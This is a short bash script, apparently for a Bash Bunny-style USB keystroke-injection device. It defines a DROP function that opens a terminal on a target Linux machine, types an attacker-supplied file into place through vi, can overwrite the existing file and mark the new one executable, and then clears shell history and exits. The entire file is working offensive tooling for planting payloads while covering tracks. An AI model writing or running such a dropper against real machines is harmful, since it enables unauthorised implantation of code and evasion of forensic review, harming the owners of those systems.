#!/bin/bash
#
# DROP v1 by bg-wa
# Simplifies dropping files from HID attacks for LINUX
# Usage: DROP bb_source_file.txt attack_destination_file.txt [overwrite: false] [executable: false]
#
# Example:
# DROP /root/udisk/payloads/$SWITCH_POSITION/source.sh ~/target_destination.sh true true
source ./run.sh

function DROP() {
    source=$1
    destination=$2
    overwrite=$3
    executable=$4
    #os=

    RUN UNITY xterm
    QUACK DELAY 1000

    if "$overwrite" == "true"
    then
        QUACK STRING rm "$destination"
        QUACK ENTER
        QUACK DELAY 500
    fi
    QUACK STRING vi "$destination"
    QUACK ENTER
    QUACK DELAY 500
    QUACK STRING i

    while IFS= read -r data
    do
        QUACK STRING "$data"
        QUACK ENTER
    done < "$source"

    QUACK DELAY 500
    QUACK ESC
    QUACK ENTER
    QUACK STRING :wq
    QUACK ENTER

    if "$executable" == "true"
    then
        QUACK STRING chmod +x "$destination"
        QUACK ENTER
        QUACK DELAY 500
    fi

    QUACK STRING history -c
    QUACK ENTER
    QUACK STRING exit
    QUACK ENTER
}

export -f DROP
